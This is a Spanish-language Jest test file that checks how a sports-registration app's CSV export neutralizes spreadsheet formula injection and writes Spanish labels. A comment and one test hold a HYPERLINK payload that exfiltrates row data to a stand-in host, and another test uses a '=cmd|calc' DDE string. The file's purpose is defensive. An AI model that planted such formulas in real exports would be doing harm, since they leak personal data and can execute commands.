// ===========================================
// E2E — Inyección de fórmulas en la exportación CSV (R15)
// ===========================================
//
// El vector no necesita ninguna credencial: el formulario público de
// inscripción acepta el apellido que uno escriba. Si alguien se anota como
// `=1+1` —o, con menos gracia,
// `=HYPERLINK("http://malo/?d="&B2,"Ver constancia")`— el padrón se exporta y
// alguien de la Secretaría lo abre con doble clic. Excel no ve un apellido: ve
// una fórmula, y la ejecuta con acceso al resto de la fila (el DNI del chico,
// el teléfono). Con el diálogo de DDE aceptado se llega a ejecución de
// comandos.
//
// La defensa es prefijar la celda con un apóstrofo. El test genera el CSV
// **completo** a través del service real (mismo `escribirCsv` que sirve el
// endpoint) y mira los bytes que salen.
import { Writable } from 'stream';
import { Test, TestingModule } from '@nestjs/testing';
import {
  ReportsService,
  etiquetaExportacion,
  neutralizarFormulaCsv,
  puntajeExportado,
  ETIQUETAS_EXPORTACION,
} from '../src/modules/reports/reports.service';
import { PrismaService } from '../src/database/prisma.service';
import { ALCANCE_PROVINCIAL, ScopeService } from '../src/common/scope';

/** Destino que acumula lo escrito, como haría el `res` de Express. */
class DestinoBuffer extends Writable {
  chunks: Buffer[] = [];
  headersSent = false;
  readonly terminado: Promise<void>;

  constructor() {
    super();
    this.terminado = new Promise((resolve, reject) => {
      this.once('finish', () => resolve());
      this.once('error', reject);
    });
  }

  _write(chunk: Buffer, _enc: BufferEncoding, cb: (e?: Error) => void) {
    this.headersSent = true;
    this.chunks.push(Buffer.from(chunk));
    cb();
  }

  get texto(): string {
    return Buffer.concat(this.chunks).toString('utf8');
  }
}

/** Participante con el apellido que le pasemos. */
function participante(indice: number, lastName: string) {
  return {
    id: `p${indice}`,
    dni: '48123456',
    firstName: 'Juan',
    lastName,
    sex: 'MASCULINO',
    birthDate: new Date('2012-05-15T00:00:00.000Z'),
    department: 'Pilcomayo',
    locality: 'Clorinda',
    phone: '3704123456',
    email: 'juan@example.com',
    inscriptions: [],
  };
}

describe('Exportación CSV — inyección de fórmulas (R15)', () => {
  let service: ReportsService;
  let apellidos: string[];
  let partidos: unknown[];
  let inscripciones: unknown[];

  beforeEach(async () => {
    apellidos = [];
    partidos = [];
    inscripciones = [];

    const prisma = {
      participant: {
        findMany: jest.fn(({ cursor }: { cursor?: { id: string } }) =>
          // Una sola página: el generador corta al recibir menos del lote.
          Promise.resolve(
            cursor ? [] : apellidos.map((a, i) => participante(i, a)),
          ),
        ),
      },
      inscription: {
        findMany: jest.fn(({ cursor }: { cursor?: { id: string } }) =>
          Promise.resolve(cursor ? [] : inscripciones),
        ),
      },
      team: { findMany: jest.fn(() => Promise.resolve([])) },
      match: {
        findMany: jest.fn(({ skip }: { skip?: number }) =>
          Promise.resolve(skip ? [] : partidos),
        ),
      },
    };

    const moduleFixture: TestingModule = await Test.createTestingModule({
      providers: [
        ReportsService,
        ScopeService,
        { provide: PrismaService, useValue: prisma },
      ],
    }).compile();

    service = moduleFixture.get(ReportsService);
  });

  /** Genera el CSV del padrón con los apellidos sembrados y lo devuelve. */
  async function generarCsv(...valores: string[]): Promise<string[]> {
    apellidos = valores;
    const destino = new DestinoBuffer();
    await service.escribirCsv(
      destino,
      service.especificacionParticipants(ALCANCE_PROVINCIAL),
    );
    destino.end();
    await destino.terminado;

    // Se descartan el BOM, la fila de alcance territorial (R05) y la de
    // encabezados.
    return destino.texto
      .replace(/^\uFEFF/, '')
      .split('\n')
      .slice(2);
  }

  /** Contenido de la columna "Apellido" (la tercera) de una fila del CSV. */
  function celdaApellido(fila: string): string {
    const celdas = fila.match(/"(?:[^"]|"")*"/g) ?? [];
    return celdas[2].slice(1, -1).replace(/""/g, '"');
  }

  // -------------------------------------------------
  // El DoD: el caso literal del hallazgo
  // -------------------------------------------------
  it('un apellido `=1+1` no arranca con `=` en el archivo', async () => {
    const [fila] = await generarCsv('=1+1');
    const celda = celdaApellido(fila);

    expect(celda.startsWith('=')).toBe(false);
    expect(celda).toBe("'=1+1");
  });

  // -------------------------------------------------
  // Los cuatro caracteres
  // -------------------------------------------------
  it.each([
    ['=', '=1+1'],
    ['+', '+1+1'],
    ['-', '-1+1'],
    ['@', '@SUM(A1:A9)'],
  ])('neutraliza el que empieza con `%s`', async (inicio, valor) => {
    const [fila] = await generarCsv(valor);
    const celda = celdaApellido(fila);

    expect(celda.startsWith(inicio)).toBe(false);
    expect(celda).toBe(`'${valor}`);
  });

  // -------------------------------------------------
  // Espacios y tabs por delante: las planillas los descartan
  // -------------------------------------------------
  it.each([[' =1+1'], ['  @SUM(A1)'], ['\t=1+1'], ['\r=1+1'], ['\t\t+1']])(
    'neutraliza `%j` aunque venga con espacios o tabs adelante',
    async (valor) => {
      const [fila] = await generarCsv(valor);
      const celda = celdaApellido(fila);

      expect(celda.startsWith("'")).toBe(true);
      expect(/^\s*[=+\-@]/.test(celda)).toBe(false);
    },
  );

  // -------------------------------------------------
  // El caso realmente peligroso
  // -------------------------------------------------
  it('neutraliza un HYPERLINK que exfiltra la fila entera', async () => {
    const ataque = '=HYPERLINK("http://malo/?d="&A1&B1,"Ver constancia")';
    const [fila] = await generarCsv(ataque);

    expect(celdaApellido(fila).startsWith('=')).toBe(false);
    // El texto se conserva: el operador tiene que poder ver qué se cargó.
    expect(celdaApellido(fila)).toContain('HYPERLINK');
  });

  it('varias filas: cada celda se evalúa por su cuenta', async () => {
    const filas = await generarCsv('Pérez', '=cmd|calc', 'Gómez');

    expect(celdaApellido(filas[0])).toBe('Pérez');
    expect(celdaApellido(filas[1])).toBe("'=cmd|calc");
    expect(celdaApellido(filas[2])).toBe('Gómez');
  });

  // -------------------------------------------------
  // Lo que NO se toca
  // -------------------------------------------------
  it('un apellido normal sale igual que antes', async () => {
    const [fila] = await generarCsv('Pérez');
    expect(celdaApellido(fila)).toBe('Pérez');
  });

  it('el escape de comillas sigue siendo el de siempre', async () => {
    const [fila] = await generarCsv('dice "hola"');
    expect(fila).toContain('"dice ""hola"""');
  });

  it('el CSV conserva el BOM y el encabezado', async () => {
    apellidos = ['Pérez'];
    const destino = new DestinoBuffer();
    await service.escribirCsv(
      destino,
      service.especificacionParticipants(ALCANCE_PROVINCIAL),
    );
    destino.end();
    await destino.terminado;

    // R05 — la primera fila declara el alcance; el encabezado quedó segundo.
    const lineas = destino.texto.replace(/^\uFEFF/, '').split('\n');
    expect(destino.texto.startsWith('\uFEFF"Alcance del reporte:')).toBe(true);
    expect(lineas[1].startsWith('"DNI"')).toBe(true);
  });

  // -------------------------------------------------
  // La función, aislada
  // -------------------------------------------------
  describe('neutralizarFormulaCsv', () => {
    it('no toca los números negativos', () => {
      // `-5` no es una fórmula; prefijarlo lo convertiría en texto y rompería
      // las columnas numéricas del reporte.
      expect(neutralizarFormulaCsv(-5)).toBe('-5');
      expect(neutralizarFormulaCsv('-5')).toBe('-5');
      expect(neutralizarFormulaCsv('-3.75')).toBe('-3.75');
      expect(neutralizarFormulaCsv('+2')).toBe('+2');
    });

    it('un valor vacío (null/undefined) es una celda vacía, no el texto "null" (S10)', () => {
      expect(neutralizarFormulaCsv(null)).toBe('');
      expect(neutralizarFormulaCsv(undefined)).toBe('');
      expect(neutralizarFormulaCsv(7)).toBe('7');
      expect(neutralizarFormulaCsv(0)).toBe('0');
      expect(neutralizarFormulaCsv('')).toBe('');
    });

    it('sí toca lo que arranca como fórmula', () => {
      expect(neutralizarFormulaCsv('=1+1')).toBe("'=1+1");
      expect(neutralizarFormulaCsv('-1+1')).toBe("'-1+1");
      expect(neutralizarFormulaCsv('@juan')).toBe("'@juan");
    });
  });

  // -------------------------------------------------
  // S10 — etiquetas en castellano y celdas vacías
  // -------------------------------------------------
  /** Celdas de una fila del CSV, sin comillas. */
  function celdas(fila: string): string[] {
    return (fila.match(/"(?:[^"]|"")*"/g) ?? []).map((c) =>
      c.slice(1, -1).replace(/""/g, '"'),
    );
  }

  async function csvDe(
    especificacion: ReturnType<ReportsService['especificacionResults']>,
  ): Promise<string[]> {
    const destino = new DestinoBuffer();
    await service.escribirCsv(destino, especificacion);
    destino.end();
    await destino.terminado;
    return destino.texto
      .replace(/^\uFEFF/, '')
      .split('\n')
      .slice(2);
  }

  describe('etiquetas y vacíos (S10)', () => {
    it('el padrón escribe el sexo en castellano', async () => {
      const [fila] = await generarCsv('Pérez');
      expect(celdas(fila)[3]).toBe('Masculino');
    });

    it('las inscripciones escriben sexo y estado en castellano', async () => {
      inscripciones = [
        {
          id: 'i1',
          qrCode: 'QR-1',
          status: 'APROBADA',
          createdAt: new Date('2026-03-01T12:00:00.000Z'),
          participant: participante(0, 'Gómez'),
          category: { name: 'Sub 14', discipline: { name: 'Fútbol' } },
          team: null,
        },
      ];
      const [fila] = await csvDe(
        service.especificacionInscriptions(ALCANCE_PROVINCIAL),
      );
      const c = celdas(fila);
      expect(c[4]).toBe('Masculino');
      expect(c[10]).toBe('Aprobada');
    });

    it('los partidos escriben etapa y estado en castellano y un puntaje null no sale como "null"', async () => {
      partidos = [
        {
          id: 'm1',
          round: 1,
          matchNumber: 3,
          status: 'EN_CURSO',
          competition: {
            name: 'Copa',
            stage: 'DEPARTAMENTAL',
            discipline: { name: 'Fútbol' },
            category: { name: 'Sub 14' },
          },
          venue: null,
          results: [
            {
              isWinner: false,
              team: { name: 'Los Pumas' },
              participant: null,
              scoreData: { goles: null },
            },
            {
              isWinner: false,
              team: { name: 'Las Garzas' },
              participant: null,
              scoreData: { goles: 2 },
            },
          ],
        },
      ];
      const [fila] = await csvDe(
        service.especificacionResults(ALCANCE_PROVINCIAL),
      );
      const c = celdas(fila);
      expect(c[3]).toBe('Departamental');
      expect(c[6]).toBe('En curso');
      // Sin puntaje sale el mismo "-" que cuando falta el resultado, tal cual:
      // un guion suelto no es una fórmula y no se prefija.
      expect(c[8]).toBe('-');
      expect(neutralizarFormulaCsv('-')).toBe('-');
      expect(neutralizarFormulaCsv('-1+1')).toBe("'-1+1");
      expect(c[10]).toBe('2');
      expect(fila).not.toContain('null');
    });

    it('etiquetaExportacion: vacío es celda vacía y lo desconocido se conserva', () => {
      expect(etiquetaExportacion(ETIQUETAS_EXPORTACION.sexo, 'FEMENINO')).toBe(
        'Femenino',
      );
      expect(etiquetaExportacion(ETIQUETAS_EXPORTACION.sexo, null)).toBe('');
      expect(etiquetaExportacion(ETIQUETAS_EXPORTACION.sexo, undefined)).toBe(
        '',
      );
      // Un código que el mapa no conoce sale tal cual: es una exportación y no
      // se puede perder el dato.
      expect(etiquetaExportacion(ETIQUETAS_EXPORTACION.etapa, 'NACIONAL')).toBe(
        'NACIONAL',
      );
    });

    it('toda etiqueta de exportación está en castellano (ninguna es su código)', () => {
      for (const mapa of Object.values(ETIQUETAS_EXPORTACION)) {
        for (const [codigo, etiqueta] of Object.entries(mapa)) {
          expect(etiqueta).not.toBe(codigo);
          expect(etiqueta.trim()).not.toBe('');
        }
      }
    });

    it('puntajeExportado: null, ausente o vacío es "-"; el cero se escribe', () => {
      expect(puntajeExportado(null)).toBe('-');
      expect(puntajeExportado(undefined)).toBe('-');
      expect(puntajeExportado({})).toBe('-');
      expect(puntajeExportado({ goles: null })).toBe('-');
      expect(puntajeExportado({ goles: 0 })).toBe('0');
      expect(puntajeExportado({ tiempo: '1:02.5' })).toBe('1:02.5');
    });
  });
});
